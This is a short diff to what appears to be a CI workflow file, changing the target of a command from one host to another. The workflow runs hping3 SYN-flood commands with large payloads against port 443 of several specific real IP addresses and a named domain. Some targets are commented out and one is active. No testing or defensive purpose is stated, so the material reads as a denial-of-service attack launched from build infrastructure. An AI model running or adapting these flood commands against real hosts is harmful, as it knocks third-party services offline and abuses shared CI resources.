@@ -42,7 +42,7 @@ jobs:
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 139.224.71.209 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 106.14.219.131 || true
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 8.153.68.92 || true
-          sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 api4.mobileanjian.com || true
+          sudo timeout 120s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 180.163.145.49 || true
 
           # fz
           # sudo timeout 60s hping3 -S --flood -V -d 65400 -p 443 -s 1000-65535 125.77.20.72 || true
